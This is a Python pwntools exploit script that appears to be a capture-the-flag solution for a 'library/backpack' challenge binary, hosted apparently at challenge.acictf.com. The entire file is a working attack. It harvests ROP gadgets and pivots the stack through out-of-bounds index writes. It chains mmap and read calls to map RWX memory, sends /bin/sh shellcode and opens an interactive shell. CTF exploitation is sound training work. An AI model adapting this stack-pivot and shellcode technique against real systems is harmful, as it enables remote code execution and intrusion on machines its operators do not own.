#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

./solve.py REMOTE HOST=challenge.acictf.com PORT=45110
"""

import ast
import struct
import subprocess

from pwn import *

PROG_PATH = './challenge'

PROT_RWX = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
EGG_SIZE = 0x1000


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def check_out(io, shelf_idx, backpack_idx):
    io.sendlineafter('\n\n', '2')
    io.sendlineafter('book in?\n', str(shelf_idx))
    io.sendlineafter('put the book?\n', str(backpack_idx))


def leave(io):
    io.sendlineafter('\n\n', '9')


def fill_choice_buffer(io, data):
    assert '\n' not in data

    io.sendlineafter('\n\n', '1')
    io.sendlineafter('\n\n', '0')
    io.sendlineafter('Title?\n', data)


class Addrs:
    CHOICE_BUF = 0x603100
    MMAP = 0x4008e0
    READ = 0x400930


def write_binary(io):
    size = io.recvn(4)
    size = struct.unpack('>I', size)[0]

    log.info('Receiving ELF of size ' + str(size))
    elf = io.recvn(size)

    with open('challenge', 'w') as f:
        f.write(elf)


def get_gadget(ropper_out, target, bad_str='0a'):
    for line in ropper_out.splitlines():
        line = line.strip()
        if not line or not line.startswith('0x'):
            continue

        addr, instr = line.split(': ')

        if bad_str in addr:
            continue

        if instr == target:
            return ast.literal_eval(addr)

    log.error('FAILED looking for: ' + target)


def get_gadgets():
    raw_gadgets = subprocess.check_output('ropper --nocolor --file ./challenge', shell=True)

    gadgets = {}
    gadgets['POP_RDI'] = get_gadget(raw_gadgets, 'pop rdi; ret;')
    gadgets['POP_RSI'] = get_gadget(raw_gadgets, 'pop rsi; ret;')
    gadgets['POP_RDX'] = get_gadget(raw_gadgets, 'pop rdx; ret;')
    gadgets['POP_R8_R9_RCX'] = get_gadget(raw_gadgets, 'pop r8; pop r9; pop rcx; ret;')
    gadgets['POP_RAX_R9_RCX'] = get_gadget(raw_gadgets, 'pop rax; pop r9; pop rcx; ret;')
    gadgets['POP_RSP'] = get_gadget(raw_gadgets, 'pop rsp; pop r13; pop r14; pop r15; ret;')

    jmp_gadgets = subprocess.check_output('ropper --nocolor --file ./challenge --jmp rax', shell=True)
    gadgets['JMP_RAX'] = get_gadget(jmp_gadgets, 'jmp rax;')

    return gadgets


def win(io):
    if args['REMOTE']:
        write_binary(io)

    gadgets = get_gadgets()

    # Account for pop's from pivoted stack pointer.
    rop = 'A' * 0x18

    mmap_addr = 0x7fe7a1e8f000

    # mmap
    rop += p64(gadgets['POP_RDI'])
    rop += p64(mmap_addr)
    rop += p64(gadgets['POP_RSI'])
    rop += p64(EGG_SIZE)
    rop += p64(gadgets['POP_RDX'])
    rop += p64(PROT_RWX)
    rop += p64(gadgets['POP_R8_R9_RCX'])
    rop += p64(0xffffffffffffffff)  # 5th arg
    rop += p64(0)  # 6th arg
    rop += p64(constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON)  # 4th arg
    rop += p64(Addrs.MMAP)

    # read
    rop += p64(gadgets['POP_RDI'])
    rop += p64(0)
    rop += p64(gadgets['POP_RSI'])
    rop += p64(mmap_addr)
    rop += p64(gadgets['POP_RDX'])
    rop += p64(EGG_SIZE)
    rop += p64(Addrs.READ)

    # redirect execution
    rop += p64(gadgets['POP_RAX_R9_RCX'])
    rop += p64(mmap_addr)
    rop += p64(0)
    rop += p64(0)
    rop += p64(gadgets['JMP_RAX'])

    fill_choice_buffer(io, rop)

    # stack pivot
    check_out(io, Addrs.CHOICE_BUF, -8)
    check_out(io, 0, -7)
    check_out(io, gadgets['POP_RSP'], -10)

    # final payload
    sc = asm(shellcraft.sh())
    assert len(sc) <= EGG_SIZE
    sc = sc + 'A' * (EGG_SIZE - len(sc))
    io.send(sc)

    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()

    if args['PAUSE']:
        raw_input('PAUSED...')

    win(io)
